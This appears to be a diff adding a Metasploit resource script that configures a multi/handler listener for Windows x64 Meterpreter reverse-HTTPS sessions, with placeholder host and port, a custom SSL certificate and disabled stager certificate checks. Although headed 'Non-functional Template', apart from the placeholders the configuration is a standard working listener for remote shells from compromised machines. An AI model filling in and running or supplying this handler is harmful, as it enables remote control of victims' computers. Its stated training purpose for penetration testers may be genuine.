@@ -1,0 +1,11 @@
+# HTTPS Handler Template
+# For Training Use – Non-functional Template
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST <LHOST>
+set LPORT <LPORT>
+set HandlerSSLCert /tmp/server.pem
+set StagerVerifySSLCert false
+set OverrideRequestHost true
+exploit -j
